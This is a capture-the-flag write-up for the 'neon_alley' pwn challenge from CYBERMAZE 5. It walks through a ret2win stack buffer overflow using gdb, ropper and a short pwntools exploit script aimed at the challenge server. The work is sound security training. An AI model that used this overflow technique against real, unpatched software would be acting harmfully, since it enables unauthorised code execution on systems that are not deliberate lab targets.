---
title: "CYBERMAZE 5 (2025) - neon_alley "
date: 2025-12-01 05:10:00 +0100
categories: [cybermaze_v5]
tags: [pwn, ret2win, writeup, spark , isetcom , easy , cybermaze_v5]
---

# [ neon_alley ] Writeup  

**Category:** [pwn]  
**Points:** [500]        
**Author:** 4n7h4r4x  

[You can download the files from my github and replay them !](https://github.com/YahyaMouelhi/cybermaze_v5)

![challenge](https://media.discordapp.net/attachments/1439691535397552128/1444806975983456287/image.png?ex=692e0cda&is=692cbb5a&hm=72a2eeb330a51197aaead375a4b56f4facad5d515c4b67e3e5f28d8f297cf849&=&format=webp&quality=lossless&width=911&height=876)


## Tools Used

- `gdb` / `ropper` 
- `python3 (pwntools)` for exploit scripting  

---

## Analysis

- The goal of of this challenge is super simple and fundamental and a must know for every pwner , it's ret2win -> basically returning to function that was never called which intrests us

- Let's run the basics commands **file and checksec** on the binary and see what we'll get :

![file and checksec output](https://media.discordapp.net/attachments/1439691535397552128/1444802990706786334/image.png?ex=692e0924&is=692cb7a4&hm=062016ab862e58afa3de4cf03f832e55ca511fe282c58495df93dc77deb06a35&=&format=webp&quality=lossless&width=1862&height=553)

- Let's go directly to gdb and analyse the binary and see what functions we have and more ...

![gdb output](https://media.discordapp.net/attachments/1439691535397552128/1444803293288071198/image.png?ex=692e096c&is=692cb7ec&hm=b407646aa73d1d147e4eaf5951c7e32f483a59000ab942047226fe7c703214c3&=&format=webp&quality=lossless&width=1615&height=751)

![gdb2 output](https://media.discordapp.net/attachments/1439691535397552128/1444804330719940819/image.png?ex=692e0a63&is=692cb8e3&hm=380c7b9367d51c55caf1e0127b9ac5d4379bf5bae20c46a6c365da27e89794f5&=&format=webp&quality=lossless&width=1862&height=660)

![gdb3 output](https://media.discordapp.net/attachments/1439691535397552128/1444804670257107139/image.png?ex=692e0ab4&is=692cb934&hm=6ee7010b1a3a0e0c2ed0a627976cbeddaf94075f788cb69088395a23af40750f&=&format=webp&quality=lossless&width=1633&height=751)


- From these pictures we can get the addresses of win and see that inside the enter function it uses gets to read input from user in rbp-0x20 so the distance between rbp and our variable is 0x20 meaning the distance between our variable and the **RIP** = 0x28 ( 40 bytes ) ,
and of course u can use the tool **cyclic** or whatever u are used to and you'll get the same value , one final trick to consider is :


![ropper output](https://media.discordapp.net/attachments/1439691535397552128/1444806659104047305/image.png?ex=692e0c8e&is=692cbb0e&hm=f4883e3c893cf6309599ff2f46ba590bf609414ce16d109c2c4a11297f5c809e&=&format=webp&quality=lossless&width=1862&height=308)


- We'll use the ret instruction to align the stack and make everything works as expected ( if you try to just directly return to win you'll face a segfault and you won't get the flag)


## Exploitation / Solution

- now finally we can start writing the exploit script and this is what i ended up writing , it's really simple :

```python

from pwn import *

context.binary = elf = ELF("./neon_alley")

win = elf.symbols["win"]
ret = 0x401016

# offset to rbp + 8
pay = b"A"*40 + p64(ret) + p64(win)

#p = elf.process()
#p = remote("localhost" , 6100)
p = remote("tcp.espark.tn"  ,6100)

p.sendline(pay)
p.interactive()


```

- if we run it we get this :

![solver.py output](https://media.discordapp.net/attachments/1439691535397552128/1444814781277016266/image.png?ex=692e141f&is=692cc29f&hm=b5ce13fecb74104b0e6afa1f58c4b34e6da0e88e3dd26eee6f2b16e71bef8cd3&=&format=webp&quality=lossless&width=1606&height=751)


- Thanks for reading hope this was helpful !
